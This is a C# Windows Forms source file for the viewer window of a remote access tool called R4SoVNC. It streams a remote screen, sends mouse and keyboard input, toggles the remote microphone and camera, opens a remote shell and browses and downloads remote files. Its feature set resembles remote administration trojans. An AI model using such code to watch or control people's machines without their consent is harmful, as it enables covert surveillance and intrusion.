using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using NAudio.Wave;
using R4SoVNC.Server.Helpers;
using R4SoVNC.Server.Network;
using R4SoVNC.Server.Protocol;

namespace R4SoVNC.Server.Forms
{
    public partial class ViewerForm : Form
    {
        private readonly ClientSession _session;
        private bool _controlling = false;
        private bool _micActive   = false;
        private bool _camActive   = false;
        private Size _remoteResolution = new Size(1920, 1080);

        private WaveOutEvent? _waveOut;
        private BufferedWaveProvider? _waveBuffer;
        private CameraForm?   _cameraForm;
        private FileTransferForm? _fileTransferForm;
        private TerminalForm? _terminalForm;

        public ViewerForm(ClientSession session)
        {
            _session = session;
            InitializeComponent();
            Text = $"R4SoVNC — {session.ClientName} [{session.IpAddress}]";

            session.PacketReceived += OnPacketReceived;
            session.Disconnected   += OnSessionDisconnected;

            pictureBox.MouseMove  += PictureBox_MouseMove;
            pictureBox.MouseDown  += PictureBox_MouseDown;
            pictureBox.MouseUp    += PictureBox_MouseUp;
            pictureBox.MouseWheel += PictureBox_MouseWheel;
            this.KeyDown   += ViewerForm_KeyDown;
            this.KeyUp     += ViewerForm_KeyUp;
            this.KeyPreview = true;

            InitAudio();
        }

        private void InitAudio()
        {
            try
            {
                var wf = new WaveFormat(44100, 16, 1);
                _waveBuffer = new BufferedWaveProvider(wf)
                {
                    BufferDuration = TimeSpan.FromSeconds(2),
                    DiscardOnBufferOverflow = true
                };
                _waveOut = new WaveOutEvent();
                _waveOut.Init(_waveBuffer);
                _waveOut.Play();
            }
            catch { }
        }

        private void OnPacketReceived(ClientSession session, Packet packet)
        {
            switch (packet.Type)
            {
                case PacketType.ScreenData:
                    UpdateScreen(packet.Data);
                    break;
                case PacketType.AudioData:
                    _waveBuffer?.AddSamples(packet.Data, 0, packet.Data.Length);
                    break;
                case PacketType.CameraFrame:
                    UpdateCamera(packet.Data);
                    break;
                case PacketType.ShellOutput:
                    _terminalForm?.AppendOutput(packet.GetDataAsString());
                    break;
                case PacketType.FileListResponse:
                    ShowFileList(packet.GetDataAsString());
                    break;
                case PacketType.FileDownloadData:
                case PacketType.FileDownloadDone:
                    _fileTransferForm?.HandleIncoming(packet);
                    break;
            }
        }

        private void UpdateScreen(byte[] jpegData)
        {
            if (InvokeRequired) { Invoke(() => UpdateScreen(jpegData)); return; }
            try
            {
                using var ms = new MemoryStream(jpegData);
                var img = Image.FromStream(ms);
                _remoteResolution = img.Size;
                var old = pictureBox.Image;
                pictureBox.Image = img;
                old?.Dispose();
                lblResolution.Text = $"{_remoteResolution.Width}×{_remoteResolution.Height}";
            }
            catch { }
        }

        private void UpdateCamera(byte[] jpegData)
        {
            if (_cameraForm == null || _cameraForm.IsDisposed) return;
            _cameraForm.UpdateFrame(jpegData);
            _cameraForm.SetStatus("● LIVE");
        }

        private void OnSessionDisconnected(ClientSession session)
        {
            this.Invoke(() =>
            {
                MessageBox.Show("Remote client disconnected.", "Disconnected",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.Close();
            });
        }

        private Point TranslatePoint(Point p)
        {
            if (pictureBox.Image == null) return p;
            float scaleX = (float)_remoteResolution.Width  / pictureBox.Width;
            float scaleY = (float)_remoteResolution.Height / pictureBox.Height;
            return new Point((int)(p.X * scaleX), (int)(p.Y * scaleY));
        }

        private void PictureBox_MouseMove(object? s, MouseEventArgs e)
        {
            if (!_controlling) return;
            var p = TranslatePoint(e.Location);
            _session.SendPacket(PacketBuilder.MouseMove(p.X, p.Y));
        }

        private void PictureBox_MouseDown(object? s, MouseEventArgs e)
        {
            if (!_controlling) return;
            var p = TranslatePoint(e.Location);
            int btn = e.Button == MouseButtons.Left ? 0 : e.Button == MouseButtons.Right ? 1 : 2;
            _session.SendPacket(PacketBuilder.MouseClick(btn, p.X, p.Y, true));
        }

        private void PictureBox_MouseUp(object? s, MouseEventArgs e)
        {
            if (!_controlling) return;
            var p = TranslatePoint(e.Location);
            int btn = e.Button == MouseButtons.Left ? 0 : e.Button == MouseButtons.Right ? 1 : 2;
            _session.SendPacket(PacketBuilder.MouseClick(btn, p.X, p.Y, false));
        }

        private void PictureBox_MouseWheel(object? s, MouseEventArgs e)
        {
            if (!_controlling) return;
            _session.SendPacket(PacketBuilder.MouseScroll(e.Delta));
        }

        private void ViewerForm_KeyDown(object? s, KeyEventArgs e)
        {
            if (!_controlling) return;
            _session.SendPacket(PacketBuilder.KeyEvent((int)e.KeyCode, true));
            e.Handled = true;
        }

        private void ViewerForm_KeyUp(object? s, KeyEventArgs e)
        {
            if (!_controlling) return;
            _session.SendPacket(PacketBuilder.KeyEvent((int)e.KeyCode, false));
            e.Handled = true;
        }

        private void btnToggleControl_Click(object sender, EventArgs e)
        {
            _controlling = !_controlling;
            if (_controlling)
            {
                btnToggleControl.Text = "🔴 Stop Control";
                btnToggleControl.BackColor = Theme.Danger;
                lblControlStatus.Text = "● CONTROLLING";
                lblControlStatus.ForeColor = Theme.Danger;
                pictureBox.Cursor = Cursors.Cross;
            }
            else
            {
                btnToggleControl.Text = "🟢 Start Control";
                btnToggleControl.BackColor = Theme.AccentDark;
                lblControlStatus.Text = "● VIEW ONLY";
                lblControlStatus.ForeColor = Theme.Success;
                pictureBox.Cursor = Cursors.Default;
            }
        }

        private void btnMic_Click(object sender, EventArgs e)
        {
            _micActive = !_micActive;
            if (_micActive)
            {
                _session.SendPacket(PacketBuilder.MicStart());
                btnMic.Text = "🔴 Mic ON";
                btnMic.BackColor = Theme.Danger;
            }
            else
            {
                _session.SendPacket(PacketBuilder.MicStop());
                btnMic.Text = "🎤 Mic";
                btnMic.BackColor = Theme.SurfaceLight;
            }
        }

        private void btnCamera_Click(object sender, EventArgs e)
        {
            _camActive = !_camActive;
            if (_camActive)
            {
                _session.SendPacket(PacketBuilder.CamStart());
                btnCamera.Text = "🔴 Cam ON";
                btnCamera.BackColor = Theme.Danger;

                if (_cameraForm == null || _cameraForm.IsDisposed)
                {
                    _cameraForm = new CameraForm($"{_session.ClientName} [{_session.IpAddress}]");
                    _cameraForm.FormClosed += (s2, e2) =>
                    {
                        _camActive = false;
                        _session.SendPacket(PacketBuilder.CamStop());
                        btnCamera.Invoke(() =>
                        {
                            btnCamera.Text = "📷 Camera";
                            btnCamera.BackColor = Theme.SurfaceLight;
                        });
                    };
                    _cameraForm.Show();
                }
            }
            else
            {
                _session.SendPacket(PacketBuilder.CamStop());
                btnCamera.Text = "📷 Camera";
                btnCamera.BackColor = Theme.SurfaceLight;
                _cameraForm?.Close();
            }
        }

        private void btnShell_Click(object sender, EventArgs e)
        {
            if (_terminalForm == null || _terminalForm.IsDisposed)
            {
                _terminalForm = new TerminalForm(_session);
                _terminalForm.FormClosed += (s2, e2) =>
                {
                    btnShell.Invoke(() =>
                    {
                        btnShell.Text = "⌨ Shell";
                        btnShell.BackColor = Theme.SurfaceLight;
                    });
                };
                _terminalForm.Show();
                btnShell.Text = "⌨ Shell ON";
                btnShell.BackColor = Theme.Warning;
            }
            else
            {
                _terminalForm.BringToFront();
            }
        }

        private void btnFileManager_Click(object sender, EventArgs e)
        {
            if (_fileTransferForm == null || _fileTransferForm.IsDisposed)
            {
                _fileTransferForm = new FileTransferForm(_session);
                _fileTransferForm.Show(this);
            }
            else _fileTransferForm.BringToFront();
            _session.SendPacket(PacketBuilder.FileListRequest(@"C:\"));
        }

        private void ShowFileList(string json)
        {
            if (InvokeRequired) { Invoke(() => ShowFileList(json)); return; }
            _fileTransferForm?.LoadFileList(json);
        }

        private void btnFullscreen_Click(object sender, EventArgs e)
        {
            if (this.FormBorderStyle == FormBorderStyle.None)
            {
                this.FormBorderStyle = FormBorderStyle.Sizable;
                this.WindowState = FormWindowState.Normal;
            }
            else
            {
                this.FormBorderStyle = FormBorderStyle.None;
                this.WindowState = FormWindowState.Maximized;
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _session.PacketReceived -= OnPacketReceived;
            _session.Disconnected   -= OnSessionDisconnected;
            if (_micActive) _session.SendPacket(PacketBuilder.MicStop());
            if (_camActive) _session.SendPacket(PacketBuilder.CamStop());
            _waveOut?.Stop();
            _waveOut?.Dispose();
            _cameraForm?.Close();
            _terminalForm?.Close();
            base.OnFormClosing(e);
        }
    }
}
